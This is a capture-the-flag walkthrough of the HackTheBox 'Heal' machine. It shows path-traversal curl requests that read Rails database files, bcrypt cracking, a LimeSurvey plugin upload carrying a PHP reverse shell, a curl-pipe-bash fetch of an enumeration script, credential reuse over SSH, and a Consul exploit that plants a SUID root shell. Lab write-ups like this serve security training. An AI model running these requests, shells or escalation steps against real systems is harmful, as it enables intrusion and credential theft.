# Heal

## Recon

::: details nmap_scan.log
```log
Open 10.10.11.46:22
Open 10.10.11.46:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.10.11.46

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 68:af:80:86:6e:61:7e:bf:0b:ea:10:52:d7:7a:94:3d (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFWKy4neTpMZp5wFROezpCVZeStDXH5gI5zP4XB9UarPr/qBNNViyJsTTIzQkCwYb2GwaKqDZ3s60sEZw362L0o=
|   256 52:f4:8d:f1:c7:85:b6:6f:c6:5f:b2:db:a6:17:68:ae (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILMCYbmj9e7GtvnDNH/PoXrtZbCxr49qUY8gUwHmvDKU
80/tcp open  http    syn-ack nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://heal.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
:::

## HTTP (80)

![Writeup.png](/assets/pentest/htb/heal/Writeup.png)

Sign up

> Creds: `let@me.in:let@me.in`

### Looking around

Main page has Resume Builder which exports html as PDF

![Writeup-1.png](/assets/pentest/htb/heal/Writeup-1.png)

`/profile` shows details about our account. `Admin` field is interesting.

![Writeup-2.png](/assets/pentest/htb/heal/Writeup-2.png)

Take survey redirects to [http://take-survey.heal.htb/index.php/552933?lang=en](http://take-survey.heal.htb/index.php/552933?lang=en)

![Writeup-3.png](/assets/pentest/htb/heal/Writeup-3.png)

`/index.php` shows administrator account email

![Writeup-4.png](/assets/pentest/htb/heal/Writeup-4.png)

From Survey -> 3 Dots we can Load Unfinished Survey, but no credentials yet. Main domain creds didn't work.

![Writeup-5.png](/assets/pentest/htb/heal/Writeup-5.png)

### LFI

Back to Download functionality; The request is made to `api.heal.htb/download` with `filename`. This introduces LFI for unrestricted file read 

![Writeup-6.png](/assets/pentest/htb/heal/Writeup-6.png)

`/etc/nginx/sites-enabled/default` didn't return anything. It's somewhat common convention to call nginx conf files domain names with or without TLD, `heal.htb` returns main domain configuration and from comments we see it's a Flask application (?).

![Writeup-7.png](/assets/pentest/htb/heal/Writeup-7.png)

After quite a lot of fuzzing I gave up on filenames and started looking into applications. Main application is written in React and for some reason it has absolute imports from `/home/ralph/resume-builder`

![Writeup-8.png](/assets/pentest/htb/heal/Writeup-8.png)

![Writeup-9.png](/assets/pentest/htb/heal/Writeup-9.png)

I somehow needed to read project files, but usual Flask application structure wasn't working. 

I stumbled upon README.md which says that project is using Ruby, and `x-runtime` seems to be specific to only Ruby. [X-Runtime Header Timing Attacks](https://www.virtuesecurity.com/kb/x-runtime-header-timing-attacks/)

![Writeup-10.png](/assets/pentest/htb/heal/Writeup-10.png)

`.gitignore`:

![Writeup-11.png](/assets/pentest/htb/heal/Writeup-11.png)

#### Database

[Where is the database file? Rails](https://stackoverflow.com/questions/18279278/where-is-the-database-file-rails)

```yml
‚îî‚îÄ$ curl -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjo3fQ.bN47YVxPM1ZVqbw4J7oHZeDc3ixY3KO6yZpM5M3nfZE' 'http://api.heal.htb/download?filename=../../config/database.yml' -s | grep -v '#'
default: &default
  adapter: sqlite3
  pool: <%= ENV.fetch("RAILS_MAX_THREADS") { 5 } %>
  timeout: 5000

development:
  <<: *default
  database: storage/development.sqlite3

test:
  <<: *default
  database: storage/test.sqlite3

production:
  <<: *default
  database: storage/development.sqlite3
```

```bash
‚îî‚îÄ$ curl -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjo3fQ.bN47YVxPM1ZVqbw4J7oHZeDc3ixY3KO6yZpM5M3nfZE' 'http://api.heal.htb/download?filename=../../storage/test.sqlite3' -so test.sqlite3

‚îî‚îÄ$ curl -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjo3fQ.bN47YVxPM1ZVqbw4J7oHZeDc3ixY3KO6yZpM5M3nfZE' 'http://api.heal.htb/download?filename=../../storage/development.sqlite3' -so dev.sqlite3
```

Test db is empty, dev has single user (admin)

![Writeup-12.png](/assets/pentest/htb/heal/Writeup-12.png)

> Hash: `$2a$12$dUZ/O7KJT3.zE4TOK8p4RuxH3t.Bz45DSr7A94VLvY9SWx1GCSZnG`

```powershell
‚ûú .\john-1.9.0-jumbo-1-win64\run\john.exe --wordlist=rockyou.txt .\hashes
Warning: detected hash type "bcrypt", but the string is also recognized as "bcrypt-opencl"
Use the "--format=bcrypt-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 4096 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
147258369        (?)
1g 0:00:00:18 DONE (2025-01-14 02:50) 0.05294g/s 26.68p/s 26.68c/s 26.68C/s 12345678910..claire
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

> Creds: `ralph:147258369`

### LimeSurvey

[https://github.com/LimeSurvey/LimeSurvey/blob/master/application/views/admin/authentication/login.php](https://github.com/LimeSurvey/LimeSurvey/blob/master/application/views/admin/authentication/login.php)

[http://take-survey.heal.htb/index.php/admin/authentication/sa/login.php](http://take-survey.heal.htb/index.php/admin/authentication/sa/login.php)

![Writeup-13.png](/assets/pentest/htb/heal/Writeup-13.png)

During enumeration phase I saw [LimeSurvey 5.2.4 - Remote Code Execution (RCE) (Authenticated)](https://www.exploit-db.com/exploits/50573) exploit, but since I didn't have version or creds I left it as is. Version for app is 6.6.4 which is greater then 5.2.4 but lack of CVE number might indicate that this is universal exploit, like editing wordpress themes with php code.

#### RCE

[\[CVE-2021-44967\] LimeSurvey RCE](https://ine.com/blog/cve-2021-44967-limesurvey-rce) -> [CVE-2021-44967](https://github.com/D3Ext/CVE-2021-44967): _This repository contains a POC (Proof of Concept) of the CVE-2021-44967 vulnerability, which affects to LimeSurvey **5.2 and higher versions**._

```bash
‚îî‚îÄ$ git clone -q https://github.com/Y1LD1R1M-1337/Limesurvey-RCE.git
‚îî‚îÄ$ cd Limesurvey-RCE
‚îî‚îÄ$ nano php-rev.php # Change IP:PORT
‚îî‚îÄ$ zip -r exploit.zip config.xml php-rev.php
  adding: config.xml (deflated 56%)
  adding: php-rev.php (deflated 61%)
‚îî‚îÄ$ nano config.xml
...
  17   ‚îÇ     <compatibility>
  18   ‚îÇ         <version>3.0</version>
  19   ‚îÇ         <version>4.0</version>
  20   ‚îÇ         <version>5.0</version>
  21   ‚îÇ         <version>6.0</version>
  22   ‚îÇ     </compatibility>
...
```

![Writeup-14.png](/assets/pentest/htb/heal/Writeup-14.png)

## Reverse Shell (www-data)

Catch reverse shell via [http://take-survey.heal.htb/upload/plugins/Y1LD1R1M/php-rev.php](http://take-survey.heal.htb/upload/plugins/Y1LD1R1M/php-rev.php)

```bash
‚îî‚îÄ$ pwncat-cs -lp 4444
[03:42:56] Welcome to pwncat üêà!                                                         __main__.py:164
[03:43:42] received connection from 10.10.11.46:53938                                         bind.py:84
[03:43:44] 0.0.0.0:4444: upgrading from /usr/bin/dash to /usr/bin/bash                    manager.py:957
[03:43:45] 10.10.11.46:53938: registered new host w/ db                                   manager.py:957
(local) pwncat$
(remote) www-data@heal:/$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Find configuration files
```bash
(remote) www-data@heal:/var/www/limesurvey$ find . -name config*php
./vendor/kcfinder/conf/config.php
./vendor/yiisoft/yii/framework/messages/config.php
./vendor/yiisoft/yii/requirements/messages/config.php
./application/config/config.php
./application/config/config-sample-mysql.php
./application/config/config-defaults.php
./application/config/config-sample-sqlsrv.php
./application/config/config-sample-dblib.php
./application/config/config-sample-pgsql.php
./application/views/admin/pluginmanager/configure.php
```

```php
# (remote) www-data@heal:/var/www/limesurvey$ cat application/config/config.php  | grep -vE '//|^\||/\*|\*/
<?php if (!defined('BASEPATH')) exit('No direct script access allowed');
return array(
        'components' => array(
                'db' => array(
                        'connectionString' => 'pgsql:host=localhost;port=5432;user=db_user;password=AdmiDi0_pA$$w0rd;dbname=survey;',
                        'emulatePrepare' => true,
                        'username' => 'db_user',
                        'password' => 'AdmiDi0_pA$$w0rd',
                        'charset' => 'utf8',
                        'tablePrefix' => 'lime_',
                ),
				'session' => array ( 'sessionName'=>'LS-ZNIDJBOXUNKXWTIP'),
                'urlManager' => array(
                        'urlFormat' => 'path',
                        'rules' => array(),
                        'showScriptName' => true,
                ),
        ),
        'config'=>array( 'debug'=>0 )
);
```

## SSH (22)

Password reuse is valid for user `ron`

```bash
‚îî‚îÄ$ sshpass -p 'AdmiDi0_pA$$w0rd' ssh ralph@heal.htb
Warning: Permanently added 'heal.htb' (ED25519) to the list of known hosts.
Permission denied, please try again.

‚îî‚îÄ$ sshpass -p 'AdmiDi0_pA$$w0rd' ssh ron@heal.htb
ron@heal:~$ id
uid=1001(ron) gid=1001(ron) groups=1001(ron)
```

### User.txt

```
ron@heal:~$ cat user.txt
c926fbeb8e02a69f94a5b26285c445ca
```

## Privileges Escalation

No sudo
```
ron@heal:~$ sudo -l
[sudo] password for ron:
Sorry, user ron may not run sudo on heal.
```

Enumerate with linpeas
```bash
ron@heal:/etc/nginx/sites-enabled$ curl 10.10.14.52/lp.sh|bash|tee /tmp/lp.log
‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ï£ Active Ports
‚ïö https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:3001          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:8300          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:8301          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:8302          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:8600          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:8500          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:8503          0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:5432          0.0.0.0:*               LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -
...
‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ï£ Users with console
postgres:x:116:123:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
ralph:x:1000:1000:ralph:/home/ralph:/bin/bash
ron:x:1001:1001:,,,:/home/ron:/bin/bash
root:x:0:0:root:/root:/bin/bash
...
drwxr-xr-x 2 root root 4096 Jan  7 14:58 /etc/nginx/sites-enabled
lrwxrwxrwx 1 root root 35 Dec  4 10:30 /etc/nginx/sites-enabled/heal.htb -> /etc/nginx/sites-available/heal.htb
server {
    listen 80;
    server_name heal.htb;
    if ($host != heal.htb) {
        rewrite ^ http://heal.htb/;
    }
    location / {
        limit_req zone=mylimit burst=20;
        proxy_pass http://127.0.0.1:3000;
        proxy_http_version 1.1;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    }
}
server {
    listen 80 default_server;
    server_name _;
    return 301 http://heal.htb/;
}
lrwxrwxrwx 1 root root 39 Dec  4 10:29 /etc/nginx/sites-enabled/api.heal.htb -> /etc/nginx/sites-available/api.heal.htb
limit_req_zone $binary_remote_addr zone=mylimit:10m rate=10r/s;
server {
    listen 80;
    server_name api.heal.htb;
    location / {
        limit_req zone=mylimit burst=20;
        proxy_pass http://127.0.0.1:3001;
        proxy_http_version 1.1;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    }
}
lrwxrwxrwx 1 root root 42 Dec  4 10:30 /etc/nginx/sites-enabled/lime-survey.htb -> /etc/nginx/sites-available/lime-survey.htb
server {
    listen 80;
    server_name take-survey.heal.htb;
    root /var/www/limesurvey;
    index index.php index.html index.htm;
    location / {
        limit_req zone=mylimit burst=20;
        try_files $uri $uri/ /index.php?$query_string;
    }
    location ~ \.php$ {
        limit_req zone=mylimit burst=20;
        include fastcgi_params;
        fastcgi_index index.php;
        fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
    }
    location ~ /\.ht {
        deny all;
    }
}
...
```

There's another HTTP application on 8500 which is serving `consul-ui` (?)
```bash
ron@heal:/etc/nginx/sites-enabled$ curl 0:8500 -L
<!DOCTYPE html>
<!--
 Copyright (c) HashiCorp, Inc.
 SPDX-License-Identifier: BUSL-1.1
-->

<html lang="en" class="ember-loading">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>Consul by HashiCorp</title>
    <meta name="description" content="">
    <meta name="viewport" content="width=device-width, initial-scale=1">

<meta name="consul-ui/config/environment" content={"modulePrefix":"consul-ui","environment":"production","rootURL":"/ui/","locationType":"fsm-with-optional","historySupportMiddleware":true,"torii":{"disableRedirectInitializer":false},"EmberENV":{"FEATURES":{},"EXTEND_PROTOTYPES":{"Date":false},"_APPLICATION_TEMPLATE_WRAPPER":false,"_DEFAULT_ASYNC_OBSERVERS":true,"_JQUERY_INTEGRATION":false,"_TEMPLATE_ONLY_GLIMMER_COMPONENTS":true},"APP":{"name":"consul-ui","version":"2.2.0+048f1936"},"resizeServiceDefaults":{"injectionFactories":["view","controller","component"]},"CONSUL_COPYRIGHT_YEAR":"2024","CONSUL_GIT_SHA":"048f193","CONSUL_VERSION":"1.19.2\n","CONSUL_BINARY_TYPE":"oss","CONSUL_UI_DISABLE_REALTIME":false,"CONSUL_UI_DISABLE_ANCHOR_SELECTION":false,"operatorConfig":{"APIPrefix":""},"CONSUL_HOME_URL":"https://www.consul.io","CONSUL_REPO_ISSUES_URL":"https://github.com/hashicorp/consul/issues/new/choose","CONSUL_DOCS_URL":"https://www.consul.io/docs","CONSUL_DOCS_LEARN_URL":"https://learn.hashicorp.com","CONSUL_DOCS_API_URL":"https://www.consul.io/api","CONSUL_DOCS_DEVELOPER_URL":"https://developer.hashicorp.com/consul/docs","CONSUL_COPYRIGHT_URL":"https://www.hashicorp.com","exportApplicationGlobal":false} />

  <!-- CONSUL_VERSION: 1.19.2
 -->
```

[https://www.consul.io](https://www.consul.io):  **Consul** is a service networking platform developed by **HashiCorp**. Consul was initially released in 2014 as a service discovery platform.

Port forward
```bash
‚îî‚îÄ$ sshpass -p 'AdmiDi0_pA$$w0rd' ssh ron@heal.htb -L 8500:0:8500
```

![Writeup-15.png](/assets/pentest/htb/heal/Writeup-15.png)

I wasn't able to find any CVE's with this server, but there's [https://github.com/owalid/consul-rce](https://github.com/owalid/consul-rce)

```bash
‚îî‚îÄ$ git clone -q https://github.com/owalid/consul-rce.git
```

Revshell didn't work from internal or outside, but creating suid binary worked.

![Writeup-16.png](/assets/pentest/htb/heal/Writeup-16.png)

```bash
ron@heal:~$ /tmp/rootbash -p
rootbash-5.1# id
uid=1001(ron) gid=1001(ron) euid=0(root) groups=1001(ron)
```

### Root.txt

```
rootbash-5.1# cat /root/root.txt
e0563fcdf917e7e87a12ffa0829493f9
```